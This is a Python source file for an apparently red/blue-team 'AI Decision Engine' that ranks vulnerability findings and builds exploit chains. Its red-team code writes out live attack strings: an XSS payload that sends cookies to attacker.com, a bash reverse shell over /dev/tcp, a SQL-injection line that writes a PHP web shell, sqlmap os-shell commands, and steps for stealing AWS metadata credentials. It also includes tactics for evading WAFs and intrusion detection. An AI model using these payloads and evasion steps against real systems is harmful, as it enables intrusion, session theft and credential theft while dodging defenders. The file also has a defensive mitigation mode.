"""
AI Decision Engine - Smart Orchestration Brain
Analyzes findings, chains exploits, adaptive evasion, risk scoring
"""
import asyncio
import json
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field, asdict
from enum import Enum
from datetime import datetime


class AttackPhase(Enum):
    """Attack kill chain phases"""
    RECONNAISSANCE = "reconnaissance"
    WEAPONIZATION = "weaponization"
    DELIVERY = "delivery"
    EXPLOITATION = "exploitation"
    INSTALLATION = "installation"
    COMMAND_CONTROL = "command_and_control"
    ACTIONS_OBJECTIVES = "actions_on_objectives"


@dataclass
class Finding:
    """Security finding"""
    finding_id: str
    finding_type: str
    severity: str  # critical, high, medium, low
    confidence: int  # 0-100
    target: str
    details: Dict[str, Any]
    mitre_techniques: List[str] = field(default_factory=list)
    exploitability: int = 0  # 0-100
    business_impact: int = 0  # 0-100


@dataclass
class ExploitChain:
    """Chain of exploits for maximum impact"""
    chain_id: str
    name: str
    description: str
    findings: List[Finding]
    steps: List[Dict[str, str]]
    total_impact: int
    success_probability: int
    mitre_techniques: List[str]


@dataclass
class ActionRecommendation:
    """Next action recommendation"""
    action_type: str
    priority: int  # 1-10 (10 = highest)
    description: str
    rationale: str
    commands: List[str]
    expected_outcomes: List[str]
    risk_level: str  # low, medium, high


class AIDecisionEngine:
    """Intelligent decision-making for red/blue team operations"""
    
    def __init__(self, mode: str = "red_team"):
        """
        Initialize decision engine
        
        Args:
            mode: 'red_team', 'blue_team', or 'purple_team'
        """
        self.mode = mode
        self.findings_database = []
        self.attack_chains = []
        self.current_phase = AttackPhase.RECONNAISSANCE
        self.evasion_level = "standard"  # standard, stealth, aggressive
        self.waf_detected = False
        self.ids_detected = False
        
    def ingest_finding(self, finding: Finding) -> None:
        """Ingest and store a new finding"""
        
        # Calculate exploitability score
        exploitability = self._calculate_exploitability(finding)
        finding.exploitability = exploitability
        
        # Calculate business impact
        business_impact = self._calculate_business_impact(finding)
        finding.business_impact = business_impact
        
        self.findings_database.append(finding)
    
    def _calculate_exploitability(self, finding: Finding) -> int:
        """Calculate how easily a finding can be exploited"""
        
        # Base score from severity
        severity_scores = {
            "critical": 90,
            "high": 70,
            "medium": 50,
            "low": 30
        }
        
        base_score = severity_scores.get(finding.severity, 40)
        
        # Adjust by finding type
        high_exploitability_types = [
            "sql_injection", "command_injection", "rce", "default_credentials",
            "authentication_bypass", "deserialization", "xxe"
        ]
        
        if any(vuln_type in finding.finding_type.lower() for vuln_type in high_exploitability_types):
            base_score += 10
        
        # Adjust by confidence
        base_score = int(base_score * (finding.confidence / 100))
        
        return min(100, base_score)
    
    def _calculate_business_impact(self, finding: Finding) -> int:
        """Calculate business impact of exploiting this finding"""
        
        impact_scores = {
            "critical": 90,
            "high": 70,
            "medium": 50,
            "low": 30
        }
        
        base_impact = impact_scores.get(finding.severity, 40)
        
        # High impact finding types
        high_impact_types = [
            "data_exposure", "sql_injection", "authentication_bypass",
            "privilege_escalation", "sensitive_file_exposed"
        ]
        
        if any(impact_type in finding.finding_type.lower() for impact_type in high_impact_types):
            base_impact += 15
        
        # Services with high business impact
        if finding.target:
            if any(service in finding.target.lower() for service in ['database', 'admin', 'api', 'payment']):
                base_impact += 10
        
        return min(100, base_impact)
    
    def analyze_findings(self) -> Dict[str, Any]:
        """
        Analyze all findings and provide strategic insights
        
        Returns:
            Analysis report with prioritization and recommendations
        """
        
        if not self.findings_database:
            return {"status": "no_findings", "recommendations": []}
        
        # Sort by exploitability * business impact
        prioritized = sorted(
            self.findings_database,
            key=lambda f: f.exploitability * f.business_impact,
            reverse=True
        )
        
        # Identify attack vectors
        attack_vectors = self._identify_attack_vectors(prioritized)
        
        # Generate exploit chains
        chains = self.discover_exploit_chains(prioritized)
        
        # Calculate overall risk score
        risk_score = self._calculate_overall_risk()
        
        return {
            "total_findings": len(self.findings_database),
            "critical_findings": len([f for f in self.findings_database if f.severity == "critical"]),
            "overall_risk_score": risk_score,
            "top_findings": [asdict(f) for f in prioritized[:10]],
            "attack_vectors": attack_vectors,
            "exploit_chains": [asdict(c) for c in chains],
            "recommended_next_actions": self.recommend_next_actions(prioritized[:5])
        }
    
    def _identify_attack_vectors(self, findings: List[Finding]) -> List[Dict[str, Any]]:
        """Identify viable attack vectors from findings"""
        
        vectors = []
        
        # Group by target
        targets = {}
        for finding in findings:
            target = finding.target
            if target not in targets:
                targets[target] = []
            targets[target].append(finding)
        
        # Analyze each target
        for target, target_findings in targets.items():
            if len(target_findings) >= 2:  # Multiple vulns on same target
                vectors.append({
                    "target": target,
                    "vulnerability_count": len(target_findings),
                    "max_severity": max([f.severity for f in target_findings], key=lambda s: ["low", "medium", "high", "critical"].index(s)),
                    "entry_points": [f.finding_type for f in target_findings],
                    "recommended_approach": "Multi-vector attack possible"
                })
        
        return vectors
    
    def discover_exploit_chains(self, findings: List[Finding]) -> List[ExploitChain]:
        """
        Discover exploit chains by combining multiple vulnerabilities
        
        Returns:
            List of viable exploit chains
        """
        
        chains = []
        
        # Pattern 1: XSS + CSRF -> Account Takeover
        xss_findings = [f for f in findings if 'xss' in f.finding_type.lower()]
        csrf_findings = [f for f in findings if 'csrf' in f.finding_type.lower()]
        
        if xss_findings and csrf_findings:
            chains.append(ExploitChain(
                chain_id="CHAIN001",
                name="XSS + CSRF -> Account Takeover",
                description="Use XSS to steal CSRF token, then execute privileged actions",
                findings=[xss_findings[0], csrf_findings[0]],
                steps=[
                    {"step": 1, "action": "Exploit XSS to inject JavaScript"},
                    {"step": 2, "action": "Steal CSRF token via JavaScript"},
                    {"step": 3, "action": "Execute CSRF attack with stolen token"},
                    {"step": 4, "action": "Elevate privileges or modify account"}
                ],
                total_impact=85,
                success_probability=75,
                mitre_techniques=["T1059", "T1557"]
            ))
        
        # Pattern 2: LFI + Log Poisoning -> RCE
        lfi_findings = [f for f in findings if 'lfi' in f.finding_type.lower() or 'file_inclusion' in f.finding_type.lower()]
        
        if lfi_findings:
            chains.append(ExploitChain(
                chain_id="CHAIN002",
                name="LFI + Log Poisoning -> RCE",
                description="Poison logs with PHP code, then include log file via LFI",
                findings=[lfi_findings[0]],
                steps=[
                    {"step": 1, "action": "Identify LFI vulnerability"},
                    {"step": 2, "action": "Poison Apache/Nginx logs with PHP code in User-Agent"},
                    {"step": 3, "action": "Include log file via LFI: /var/log/apache2/access.log"},
                    {"step": 4, "action": "Execute arbitrary PHP code"}
                ],
                total_impact=95,
                success_probability=80,
                mitre_techniques=["T1190", "T1059"]
            ))
        
        # Pattern 3: SQL Injection + File Write -> Web Shell
        sqli_findings = [f for f in findings if 'sql' in f.finding_type.lower()]
        
        if sqli_findings:
            chains.append(ExploitChain(
                chain_id="CHAIN003",
                name="SQL Injection + File Write -> Web Shell",
                description="Use SQLi to write web shell to disk",
                findings=[sqli_findings[0]],
                steps=[
                    {"step": 1, "action": "Exploit SQL injection"},
                    {"step": 2, "action": "Check if file write privileges exist (FILE permission)"},
                    {"step": 3, "action": "Write PHP web shell: SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'"},
                    {"step": 4, "action": "Access web shell and execute commands"}
                ],
                total_impact=100,
                success_probability=70,
                mitre_techniques=["T1190", "T1505.003"]
            ))
        
        # Pattern 4: SSRF + Cloud Metadata -> AWS Keys
        ssrf_findings = [f for f in findings if 'ssrf' in f.finding_type.lower()]
        
        if ssrf_findings:
            chains.append(ExploitChain(
                chain_id="CHAIN004",
                name="SSRF + Cloud Metadata -> AWS Key Theft",
                description="Use SSRF to access cloud metadata and steal credentials",
                findings=[ssrf_findings[0]],
                steps=[
                    {"step": 1, "action": "Exploit SSRF vulnerability"},
                    {"step": 2, "action": "Access AWS metadata: http://169.254.169.254/latest/meta-data/"},
                    {"step": 3, "action": "Retrieve IAM role credentials"},
                    {"step": 4, "action": "Use stolen AWS keys for lateral movement"}
                ],
                total_impact=95,
                success_probability=85,
                mitre_techniques=["T1190", "T1552.005"]
            ))
        
        # Pattern 5: Subdomain Takeover + Phishing
        subdomain_findings = [f for f in findings if 'subdomain' in f.finding_type.lower() or 'takeover' in f.finding_type.lower()]
        
        if subdomain_findings:
            chains.append(ExploitChain(
                chain_id="CHAIN005",
                name="Subdomain Takeover + Phishing Campaign",
                description="Take over vulnerable subdomain, host phishing page",
                findings=[subdomain_findings[0]],
                steps=[
                    {"step": 1, "action": "Identify vulnerable subdomain (dangling CNAME)"},
                    {"step": 2, "action": "Claim subdomain on cloud service"},
                    {"step": 3, "action": "Host legitimate-looking phishing page"},
                    {"step": 4, "action": "Harvest credentials from trusting users"}
                ],
                total_impact=80,
                success_probability=90,
                mitre_techniques=["T1584.001", "T1566"]
            ))
        
        # Pattern 6: Default Credentials + Privilege Escalation
        default_cred_findings = [f for f in findings if 'default' in f.finding_type.lower() or 'weak_password' in f.finding_type.lower()]
        privesc_findings = [f for f in findings if 'privilege' in f.finding_type.lower() or 'escalation' in f.finding_type.lower()]
        
        if default_cred_findings:
            chains.append(ExploitChain(
                chain_id="CHAIN006",
                name="Default Credentials + Privilege Escalation",
                description="Login with default creds, then escalate to root/admin",
                findings=[default_cred_findings[0]] + (privesc_findings[:1] if privesc_findings else []),
                steps=[
                    {"step": 1, "action": "Login with default credentials"},
                    {"step": 2, "action": "Enumerate privilege escalation vectors"},
                    {"step": 3, "action": "Exploit sudo misconfiguration or SUID binary"},
                    {"step": 4, "action": "Achieve root/admin access"}
                ],
                total_impact=90,
                success_probability=75,
                mitre_techniques=["T1078.001", "T1068"]
            ))
        
        self.attack_chains = chains
        return chains
    
    def recommend_next_actions(self, top_findings: List[Finding]) -> List[ActionRecommendation]:
        """
        Recommend next actions based on findings and current phase
        
        Args:
            top_findings: Top prioritized findings
        
        Returns:
            List of recommended actions
        """
        
        recommendations = []
        
        if not top_findings:
            return recommendations
        
        # RED TEAM MODE
        if self.mode == "red_team":
            # Immediate exploitation
            for i, finding in enumerate(top_findings[:3]):
                if finding.exploitability > 70:
                    recommendations.append(ActionRecommendation(
                        action_type="exploit",
                        priority=10 - i,
                        description=f"Exploit {finding.finding_type} on {finding.target}",
                        rationale=f"High exploitability ({finding.exploitability}%) and business impact ({finding.business_impact}%)",
                        commands=self._generate_exploit_commands(finding),
                        expected_outcomes=[
                            "Initial access established",
                            "Ability to execute commands",
                            "Potential for privilege escalation"
                        ],
                        risk_level="medium"
                    ))
            
            # If exploit chains exist, recommend those
            if self.attack_chains:
                top_chain = max(self.attack_chains, key=lambda c: c.total_impact * c.success_probability)
                recommendations.append(ActionRecommendation(
                    action_type="exploit_chain",
                    priority=10,
                    description=f"Execute exploit chain: {top_chain.name}",
                    rationale=f"Chaining {len(top_chain.findings)} vulnerabilities for maximum impact",
                    commands=[step["action"] for step in top_chain.steps],
                    expected_outcomes=[
                        "Complete compromise of target",
                        "Elevated privileges",
                        "Persistent access"
                    ],
                    risk_level="high"
                ))
        
        # BLUE TEAM MODE
        elif self.mode == "blue_team":
            # Prioritize patching critical findings
            critical_findings = [f for f in top_findings if f.severity == "critical"]
            
            for i, finding in enumerate(critical_findings[:3]):
                recommendations.append(ActionRecommendation(
                    action_type="patch",
                    priority=10 - i,
                    description=f"Patch {finding.finding_type} on {finding.target}",
                    rationale=f"Critical severity with high business impact ({finding.business_impact}%)",
                    commands=self._generate_mitigation_commands(finding),
                    expected_outcomes=[
                        "Vulnerability remediated",
                        "Attack surface reduced",
                        "Compliance improved"
                    ],
                    risk_level="low"
                ))
            
            # Recommend monitoring
            recommendations.append(ActionRecommendation(
                action_type="monitor",
                priority=7,
                description="Enable enhanced logging and monitoring",
                rationale="Multiple vulnerabilities detected - increase visibility",
                commands=[
                    "Enable application logging",
                    "Configure SIEM alerts",
                    "Deploy WAF with strict rules"
                ],
                expected_outcomes=[
                    "Improved threat detection",
                    "Faster incident response",
                    "Attack visibility"
                ],
                risk_level="low"
            ))
        
        return sorted(recommendations, key=lambda r: r.priority, reverse=True)
    
    def _generate_exploit_commands(self, finding: Finding) -> List[str]:
        """Generate exploit commands for a finding"""
        
        commands = []
        
        if 'sql_injection' in finding.finding_type.lower():
            commands = [
                f"sqlmap -u '{finding.target}' --batch --dbs",
                f"sqlmap -u '{finding.target}' --batch --dump",
                f"sqlmap -u '{finding.target}' --os-shell"
            ]
        
        elif 'xss' in finding.finding_type.lower():
            commands = [
                "Inject: <script>fetch('http://attacker.com/?c='+document.cookie)</script>",
                "Use BeEF framework for advanced exploitation",
                "Steal session tokens and credentials"
            ]
        
        elif 'command_injection' in finding.finding_type.lower():
            commands = [
                "Test: ; whoami",
                "Test: | id",
                "Reverse shell: ; bash -i >& /dev/tcp/attacker/4444 0>&1"
            ]
        
        elif 'default_credentials' in finding.finding_type.lower():
            commands = [
                f"Login to {finding.target} with default credentials",
                "Enumerate user privileges",
                "Search for privilege escalation vectors"
            ]
        
        else:
            commands = [
                f"Manually exploit {finding.finding_type}",
                "Refer to exploit database (Exploit-DB)",
                "Check for public POC exploits"
            ]
        
        return commands
    
    def _generate_mitigation_commands(self, finding: Finding) -> List[str]:
        """Generate mitigation commands for a finding"""
        
        commands = []
        
        if 'sql_injection' in finding.finding_type.lower():
            commands = [
                "Use parameterized queries/prepared statements",
                "Implement input validation and sanitization",
                "Apply principle of least privilege to database user",
                "Deploy WAF with SQLi rules"
            ]
        
        elif 'xss' in finding.finding_type.lower():
            commands = [
                "Encode all user input before output",
                "Implement Content-Security-Policy header",
                "Use HTTPOnly and Secure flags on cookies",
                "Validate and sanitize all inputs"
            ]
        
        elif 'command_injection' in finding.finding_type.lower():
            commands = [
                "Avoid system calls with user input",
                "Use parameterized APIs instead of shell execution",
                "Implement strict input validation",
                "Run application with minimal privileges"
            ]
        
        elif 'default_credentials' in finding.finding_type.lower():
            commands = [
                "Force password change on first login",
                "Implement strong password policy",
                "Enable MFA for all accounts",
                "Audit all accounts for weak credentials"
            ]
        
        else:
            commands = [
                "Apply latest security patches",
                "Follow vendor security guidelines",
                "Implement defense-in-depth controls",
                "Schedule regular security assessments"
            ]
        
        return commands
    
    def adaptive_evasion_strategy(self, detection_event: str) -> Dict[str, Any]:
        """
        Adapt attack strategy based on detection events
        
        Args:
            detection_event: Type of detection (waf, ids, rate_limit, honeypot)
        
        Returns:
            Updated strategy with evasion techniques
        """
        
        strategy = {
            "original_approach": self.evasion_level,
            "detection_event": detection_event,
            "new_approach": None,
            "evasion_techniques": []
        }
        
        if detection_event == "waf":
            self.waf_detected = True
            self.evasion_level = "stealth"
            
            strategy["new_approach"] = "stealth"
            strategy["evasion_techniques"] = [
                "Use case variation and encoding",
                "Fragment payloads across multiple requests",
                "Use WAF bypass techniques (null bytes, comments)",
                "Slow down request rate",
                "Rotate User-Agents and IPs"
            ]
        
        elif detection_event == "ids":
            self.ids_detected = True
            self.evasion_level = "stealth"
            
            strategy["new_approach"] = "stealth"
            strategy["evasion_techniques"] = [
                "Use encrypted payloads",
                "Fragment network traffic",
                "Use DNS tunneling or ICMP",
                "Randomize timing between requests",
                "Blend with legitimate traffic patterns"
            ]
        
        elif detection_event == "rate_limit":
            strategy["new_approach"] = "slow_and_steady"
            strategy["evasion_techniques"] = [
                "Significantly reduce request rate",
                "Use multiple source IPs (proxies/VPN)",
                "Implement intelligent backoff",
                "Mimic human behavior patterns"
            ]
        
        elif detection_event == "honeypot":
            strategy["new_approach"] = "abort"
            strategy["evasion_techniques"] = [
                "Immediately cease current attack vector",
                "Mark honeypot indicators for avoidance",
                "Switch to different target or approach",
                "Review reconnaissance for honeypot signs"
            ]
        
        return strategy
    
    def _calculate_overall_risk(self) -> int:
        """Calculate overall risk score from all findings"""
        
        if not self.findings_database:
            return 0
        
        # Weight by severity
        severity_weights = {"critical": 10, "high": 7, "medium": 4, "low": 2}
        
        total_risk = sum(
            severity_weights.get(f.severity, 1) * (f.confidence / 100) * (f.business_impact / 100)
            for f in self.findings_database
        )
        
        # Normalize to 0-100
        max_possible = len(self.findings_database) * 10
        risk_score = int((total_risk / max_possible) * 100) if max_possible > 0 else 0
        
        return min(100, risk_score)


# CLI usage example
if __name__ == "__main__":
    import sys
    
    # Create engine
    engine = AIDecisionEngine(mode="red_team")
    
    # Sample findings
    finding1 = Finding(
        finding_id="F001",
        finding_type="sql_injection",
        severity="critical",
        confidence=95,
        target="https://example.com/login",
        details={"parameter": "username", "method": "POST"},
        mitre_techniques=["T1190"]
    )
    
    finding2 = Finding(
        finding_id="F002",
        finding_type="xss",
        severity="high",
        confidence=85,
        target="https://example.com/search",
        details={"parameter": "q", "type": "reflected"},
        mitre_techniques=["T1059"]
    )
    
    # Ingest findings
    engine.ingest_finding(finding1)
    engine.ingest_finding(finding2)
    
    # Analyze
    analysis = engine.analyze_findings()
    
    print(json.dumps(analysis, indent=2, default=str))
